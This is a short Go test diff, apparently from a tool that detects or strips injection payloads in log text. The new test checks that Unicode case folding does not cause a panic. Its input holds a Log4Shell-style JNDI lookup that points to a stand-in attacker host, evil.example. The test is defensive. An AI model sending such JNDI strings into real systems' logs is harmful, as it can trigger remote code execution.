@@ -5,6 +5,15 @@ import (
 	"testing"
 )
 
+func TestStripGadgetOnceUnicodeCaseFold(t *testing.T) {
+	// ToLower can change byte length (İ → i + combining dot). leftover
+	// calculation must not panic.
+	got := stripGadgetOnce("İnote ${jndi:ldap://evil.example/a} in logs", `${jndi:ldap://evil.example/a}`)
+	if got == "" && classifyPayloadIsolation("İnote ${jndi:ldap://evil.example/a} in logs") == "" {
+		t.Fatal("expected leftover or isolation result")
+	}
+}
+
 func TestClassifyPayloadIsolation(t *testing.T) {
 	cases := []struct {
 		name, text, want string
